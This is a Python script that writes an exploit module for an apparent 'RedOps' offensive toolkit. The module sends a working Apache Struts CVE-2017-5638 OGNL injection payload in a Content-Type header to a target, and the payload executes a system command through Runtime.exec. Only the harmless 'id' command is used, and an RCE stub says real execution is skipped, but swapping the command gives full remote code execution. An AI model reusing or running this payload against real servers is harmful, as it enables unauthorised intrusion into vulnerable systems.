from pathlib import Path

project_root = Path(__file__).resolve().parent.parent
exploit_dir = project_root / "RedOps" / "Core" / "exploits"
exploit_dir.mkdir(parents=True, exist_ok=True)

struts_path = exploit_dir / "apache_struts.py"
init_path = exploit_dir / "__init__.py"

# Apache Struts CVE-2017-5638
struts_code = """
import requests

def check_struts_rce(target):
    print(f"[+] Checking Apache Struts OGNL Injection (CVE-2017-5638) on {target}")
    headers = {
        "Content-Type": "%{(#nike='multipart/form-data')."
                        "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
                        "(#_memberAccess?#_memberAccess=#dm:("
                        "#context.setMemberAccess(#dm)))."
                        "(@java.lang.Runtime@getRuntime().exec('id'))}"
    }
    try:
        r = requests.get(target, headers=headers, timeout=5)
        if r.status_code == 200:
            print("[!!!] Apache Struts target might be vulnerable (check for out-of-band results).")
            return True
    except Exception as e:
        print(f"[!] Error during check: {e}")
    return False

def simulate_rce(target):
    print("[*] Simulating RCE via OGNL Injection... (real RCE skipped for safety)")
"""

struts_path.write_text(struts_code.strip(), encoding="utf-8")

if not init_path.exists():
    init_path.write_text("", encoding="utf-8")

print(f"[âœ”] Apache Struts module saved at: {struts_path.relative_to(project_root)}")